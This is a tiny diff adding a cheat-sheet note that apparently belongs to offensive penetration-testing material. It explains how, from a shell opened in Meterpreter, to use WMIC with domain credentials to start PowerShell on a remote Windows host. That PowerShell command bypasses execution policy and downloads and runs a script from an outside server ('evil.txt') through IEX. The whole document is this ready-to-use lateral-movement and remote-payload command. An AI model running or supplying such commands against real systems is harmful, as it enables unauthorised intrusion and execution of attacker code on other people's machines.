@@ -1,0 +1,2 @@
+From a Windows command prompted spawned with "shell" in Meterpreter, use WMIC to remotely execute a Powershell command to download and run a Powershell script:
+WMIC /User:"Domain\User" /Password:"thepasswordlol" /Node:"1.2.3.4" process call create "powershell.exe -exec bypass -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://9.8.7.6/evil.txt');\""
